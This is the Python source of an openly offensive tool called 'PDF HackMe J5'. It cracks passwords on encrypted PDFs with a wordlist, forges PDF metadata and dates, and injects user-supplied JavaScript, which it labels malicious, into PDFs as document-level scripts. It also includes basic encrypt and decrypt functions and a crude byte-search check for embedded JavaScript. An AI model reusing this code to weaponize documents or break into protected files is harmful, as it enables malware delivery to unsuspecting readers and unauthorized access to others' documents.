# Versoin: 1.2
# Author: evilfeonix
# Name: PDF HackMe J5
# Email: evilfeonix@gmail.com
# Modified: 16 - MARCH - 2025
# Created: 12 - JANUARY - 2025
# Website: https://evilfeonix.github.io 

# all in one PDF file hacking script, 
# which include encrypting and decrypting PDF, cracking PDF decryption key, 
# changing PDF file metadata, injecting JavaScript malicious code into PDF file,
# and finally check if a pdf file is infected with malicious javascript code

import re, os, sys, time, argparse

try:
    import webbrowser
    from colorama import Fore
    from PyPDF2 import PdfWriter, PdfReader
except:
    print(f' ')
    print(f'{Fore.RED}[-] Run: pip install -r requirements.txt')
    print(f'{Fore.WHITE}')
    os.sys.exit()

def exitME():
    print(f"")
    print(f"{Fore.RED}===========================================================")
    print(f"    {Fore.CYAN}Thanks for using our PDF hacking script{Fore.RED}             ")
    print(f"==========================================================={Fore.WHITE}")
    os.sys.exit(0)
    

def banner():
    os.system("cls || clearS")
    return f"""{Fore.RED}
 ____  ____  _____     _   _   {Fore.CYAN}v[1.2]{Fore.RED}   _    __  __
|  _ \|  _ \|  ___|   | | | | __ _  ___| | _|  \/  | ___
| |_) | | | | |_ _____| |_| |/ _` |/ __| |/ / |\/| |/ _ \\
|  __/| |_| |  _|_____|  _  | (_| | (__|   <| |  | |  __/
|_|   |____/|_|       |_| |_|\__,_|\___|_|\_\_|  |_|\___|
                                      _ ____
  {Fore.GREEN}Coded by {Fore.CYAN}EvilFeonix {Fore.RED}               | | ___|
  {Fore.GREEN}evilfeonix@gmail.com{Fore.RED}            _  | |___ \\
  {Fore.GREEN}https://evilfeonix.github.io{Fore.RED}   | |_| |___) |
                                  \___/|____/{Fore.WHITE}
           [+]{Fore.GREEN} All in one PDF hacking script{Fore.WHITE} [+]    {Fore.RED}         
==========================================================={Fore.WHITE}"""

def aboutME():
    time.sleep(1)
    print(banner())
    print(f"\n    {Fore.CYAN}Version        ::   {Fore.WHITE}v[1.2]              ")
    print(f"    {Fore.CYAN}Tool Name      ::   {Fore.WHITE}WiFi-Crack             ")
    print(f"    {Fore.CYAN}Author         ::   {Fore.WHITE}evilfeonix          ")
    print(f"    {Fore.CYAN}Github         ::   {Fore.WHITE}Digital Firebird    ")
    print(f"    {Fore.CYAN}Youtube        ::   {Fore.WHITE}Digital Firebird    ")
    print(f"    {Fore.CYAN}Latest Update  ::   {Fore.WHITE}15 - March - 2025   ")
    print(f"                                                              ")
    print(f"         [+] {Fore.CYAN}Subscribe To Our YouTube Channel{Fore.WHITE} [+]{Fore.RED}")
    print(f"==========================================================={Fore.WHITE}\n")
    print(f"                     {Fore.CYAN}About this Program{Fore.WHITE}                    ")
    print(f" This is a program written in python, this program allow")
    print(f" Hacking PDF file, some features of this program include")
    print(f"    Encrypting PDF as well as decryption it")
    print(f"    Changing PDF metadatas (eg.title, author, and more!)")
    print(f"    Cracking enctypted PDF to identified the decryption key")
    print(f"    Injecting malicious javascript code into PDF file")
    print(f"    And finally, identifies if a PDF is infected with JS code{Fore.RED}")
    print(f"\n==========================================================={Fore.WHITE}")

def HackMe(inPDF,outPDF):
    write_pdf = PdfWriter()

    try:read_pdf = PdfReader(inPDF)
    except FileNotFoundError:
        print(f"{Fore.RED}[-] We can't find this file: {inPDF}{Fore.WHITE}")
        print(f'{Fore.WHITE}')
        os.sys.exit() 

    js = input(f"{Fore.CYAN}[+] Enter path to javascript file: {Fore.WHITE}")
    try:js_file = open(js,'r')
    except FileNotFoundError:
        print(f"{Fore.RED}[-] We can't find this file: {js}{Fore.WHITE}")
        print(f'{Fore.WHITE}')
        os.sys.exit()

    js_code = js_file.read()                                                # alert;    console.log
    js_payload = re.sub(r'([a-zA-Z0-9_]+)\(',r'app.\1(',js_code)            # app.alert;    console.app.log
    js_payload = re.sub(r'(\w+)\.app.(\w+)\(',r'app.\1.\2(',js_payload)     # console.app.log ~to~ app.console.log
    js_file.close
    
    import PyPDF2
    write_pdf.add_js(js_payload) 

    try:
        page_len = len(read_pdf.pages)  # knows if given PDF file was already encrypted
        for idx in range(page_len):
            page = read_pdf.pages[idx]
            write_pdf.add_page(page)
    except PyPDF2.errors.FileNotDecryptedError:
        print(f"{Fore.CYAN}[!] This PDF file was encrypted! {Fore.WHITE}")
        print(f"{Fore.CYAN}[!] Decrypt this PDF before we can inject your own malicious JS code! {Fore.WHITE}")
        os.sys.exit(1)
        
        # write_pdf.encrypt(user_password=user_pswd,owner_password=owner_pswd,permissions_flag=0b0100)

    with open(outPDF,"wb") as new_pdf:
        write_pdf.write(new_pdf) 

    time.sleep(1)    
    print(f"{Fore.GREEN}[*] We successfully inject your own malicious JS code into this PDF.{Fore.WHITE}")

def j52PDF(inPDF,outPDF):
    HackMe(inPDF,outPDF)

def PDFmetadata(inPDF,outPDF):
    write_pdf = PdfWriter()

    try:read_pdf = PdfReader(inPDF)
    except FileNotFoundError:
        print(f"{Fore.RED}[-] We can't find this file: {inPDF}{Fore.WHITE}")
        print(f'{Fore.WHITE}')
        os.sys.exit()


    try:
        import PyPDF2
        page_len = len(read_pdf.pages)  # knows if given PDF file was already encrypted
        for idx in range(page_len):
            page = read_pdf.pages[idx]
            write_pdf.add_page(page)
    except PyPDF2.errors.FileNotDecryptedError:
        print(f"{Fore.CYAN}[!] This PDF file was encrypted already! {Fore.WHITE}")
        print(f"{Fore.CYAN}[!] Decrypt this PDF before we can change it metadata! {Fore.WHITE}")
        os.sys.exit(1)
       
    title = input(f"{Fore.CYAN}[+] Change PDF title: {Fore.WHITE}")
    author = input(f"{Fore.CYAN}[+] Enter author name (ur name): {Fore.WHITE}")
    subject = input(f"{Fore.CYAN}[+] Enter PDF subject to change: {Fore.WHITE}")
    keyword = input(f"{Fore.CYAN}[+] Enter PDF keywords to change: {Fore.WHITE}")
    created = input(f"{Fore.CYAN}[+] Set created date (d/m/yy, h:m:s AM/PM): {Fore.WHITE}")
    modified = input(f"{Fore.CYAN}[+] Set modification date (d/m/yy, h:m:s AM/PM): {Fore.WHITE}")

    write_pdf.add_metadata({
        "/Title":title,
        "/Author":author,
        "/Subject":subject,
        "/Keywords":keyword,
        "/Created":created,
        "/Modified":modified,
        "/Application":"PDF HackMe J5 by evilfeonix",
    })
    
    with open(outPDF,"wb") as new_pdf:
        write_pdf.write(new_pdf) 

    time.sleep(1)    
    print(f"{Fore.GREEN}[*] We successfully change this PDF metadata.{Fore.WHITE}")
        

def enctyptPDF(inPDF,outPDF):
    write_pdf = PdfWriter()

    try:read_pdf = PdfReader(inPDF)
    except FileNotFoundError:
        print(f"{Fore.RED}[-] We can't find this file: {inPDF}{Fore.WHITE}")
        print(f'{Fore.WHITE}')
        os.sys.exit()

    import PyPDF2
    user_pswd = input(f"{Fore.CYAN}[+] Enter encryption key: {Fore.WHITE}")

    try:
        page_len = len(read_pdf.pages)  # knows if given PDF file was already encrypted
        for idx in range(page_len):
            page = read_pdf.pages[idx]
            write_pdf.add_page(page)
    except PyPDF2.errors.FileNotDecryptedError:
        print(f"{Fore.CYAN}[!] This PDF file was encrypted already! {Fore.WHITE}")
        os.sys.exit(1)

    write_pdf.encrypt(user_pswd) 
    with open(outPDF,"wb") as inPDF:
        write_pdf.write(inPDF)

    time.sleep(1)    
    print(f"{Fore.CYAN}[*] We haved successfully encrypt this PDF.{Fore.WHITE}")
        

def decryptPDF(inPDF,outPDF):
    write_pdf = PdfWriter()

    try:read_pdf = PdfReader(inPDF)
    except FileNotFoundError:
        print(f"{Fore.RED}[-] We can't find this file: {inPDF}{Fore.WHITE}")
        print(f'{Fore.WHITE}')
        os.sys.exit()
        
    user_pswd = input(f"{Fore.CYAN}[+] Enter decryption key: {Fore.WHITE}")

    import PyPDF2
    if read_pdf.is_encrypted:
        read_pdf.decrypt(user_pswd)
        try:
            page_len = len(read_pdf.pages)
            for idx in range(page_len):
                page = read_pdf.pages[idx]
                write_pdf.add_page(page)
        except PyPDF2.errors.FileNotDecryptedError:
            print(f"{Fore.RED}[-] Incorrect PDF password {user_pswd}{Fore.WHITE}")
            os.sys.exit(1)
    else:
        print(f"{Fore.CYAN}[!] This PDF file was not encrypted{Fore.WHITE}")
        os.sys.exit(1)

    with open(outPDF,"wb") as inPDF:
        write_pdf.write(inPDF)

    time.sleep(2)
    print(f"{Fore.CYAN}[*] We haved successfully decrypt this PDF.{Fore.WHITE}")



def check(inPDF,outPDF):
    try:
        with open(inPDF,"r") as f:
            pass
    except:
        print(f"{Fore.RED}[-] We can't find this file: {inPDF}{Fore.WHITE}")
        os.sys.exit(1)

    with open(inPDF,"rb") as f:
        pswds = f.read()

    if b"/JavaScript" in pswds or b"/JS (" in pswds or b"/JS <" in pswds:
        print(f"{Fore.RED}[!] This PDF file was infected with malicious javascript code{Fore.WHITE}")
        print(f"{Fore.RED}[!] Be curefull with this PDF, otherwise! u fall victim of unknown hacker{Fore.WHITE}")
    else:
        print(f"{Fore.GREEN}[*] This PDF is saved, no malicious javascript code is injected!{Fore.WHITE}")
    # print(pswds)


def crackPass(inPDF,outPDF):
    write_pdf = PdfWriter()

    try:read_pdf = PdfReader(inPDF)
    except FileNotFoundError:
        print(f"{Fore.RED}[-] We can't find this file: {inPDF}{Fore.WHITE}")
        print(f'{Fore.WHITE}')
        os.sys.exit(1)
        
    passFile = input(f"{Fore.CYAN}[+] Enter path to wordlist: {Fore.WHITE}")
    try:
        with open(passFile,"r") as f:
            pass
    except:
        print(f"{Fore.RED}[-] We can't find this file: {passFile}{Fore.WHITE}")
        os.sys.exit(1)

    with open(passFile,"r") as f:
        pswds = f.readlines()

    for pswd in pswds:
        pswd=pswd.strip()
        import PyPDF2
        if read_pdf.is_encrypted:
            read_pdf.decrypt(pswd)
            try:
                page_len = len(read_pdf.pages)
                for idx in range(page_len):
                    page = read_pdf.pages[idx]
                    write_pdf.add_page(page)
                
                time.sleep(1)
                print(f"{Fore.GREEN}\n[*] This PDF has been successfully cracked!{Fore.WHITE}")
                print(f"{Fore.GREEN}[*] Password is: {pswd}{Fore.WHITE}")
                os.sys.exit(0)
            except PyPDF2.errors.FileNotDecryptedError:
                print(f"{Fore.RED}[-] Password Not Match: {pswd}")
                
        else:
            print(f"{Fore.RED}[!] This PDF file was not encrypted{Fore.WHITE}")
            os.sys.exit(1)

    print(f"{Fore.CYAN}[!] This PDF password was not found in wordlist{Fore.WHITE}")
    os.sys.exit(0)
        
    with open(outPDF,"wb") as inPDF:
        write_pdf.write(inPDF)

def main():

    time.sleep(1)
    print(banner())
    
    print(f"""
[00] {Fore.CYAN}Exit program{Fore.WHITE}
[01] {Fore.CYAN}About program{Fore.WHITE}
[02] {Fore.CYAN}Encrypt your PDF{Fore.WHITE}
[03] {Fore.CYAN}Decrypt your PDF{Fore.WHITE}
[04] {Fore.CYAN}Change PDF metadata{Fore.WHITE}
[05]{Fore.CYAN} Crack encrypted PDF{Fore.WHITE}
[06] {Fore.CYAN}Inject JS code to PDF{Fore.WHITE}
[07] {Fore.CYAN}Check if PDF is infected{Fore.WHITE}
    """)

    act=input(f"{Fore.CYAN}[+] How can we help you today:{Fore.WHITE} ")
    
    if act in ["0","00"]:
        exitME()
    elif act in ["1","01"]:
        aboutME()
    elif act in ["2","02"]:
        input_pdf = input(f"{Fore.CYAN}[+] Enter path to PDF:{Fore.WHITE} ")
        enctyptPDF(input_pdf,input_pdf)
    elif act in ["3","03"]:
        input_pdf = input(f"{Fore.CYAN}[+] Enter path to PDF:{Fore.WHITE} ")
        decryptPDF(input_pdf,input_pdf)
    elif act in ["4","04"]:
        input_pdf = input(f"{Fore.CYAN}[+] Enter path to PDF:{Fore.WHITE} ")
        PDFmetadata(input_pdf,input_pdf)
    elif act in ["5","05"]:
        input_pdf = input(f"{Fore.CYAN}[+] Enter path to PDF:{Fore.WHITE} ")
        crackPass(input_pdf,input_pdf)
    elif act in ["6","06"]:
        input_pdf = input(f"{Fore.CYAN}[+] Enter path to PDF:{Fore.WHITE} ")
        j52PDF(input_pdf,input_pdf)
    elif act in ["7","07"]:
        input_pdf = input(f"{Fore.CYAN}[+] Enter path to PDF:{Fore.WHITE} ")
        check(input_pdf,input_pdf)
    else:
        print(f"{Fore.RED}[-] Invalid choice{Fore.WHITE}")
        print(f"{Fore.RED}[-] Please choose from the above mentioned{Fore.WHITE}")
        

    act = input(f"\n{Fore.CYAN}[+] Will you like to perform any action: {Fore.WHITE}")
    if act.lower() in ["y","yes"]:
        main()
    exitME()
    


if __name__ == "__main__":
    main()

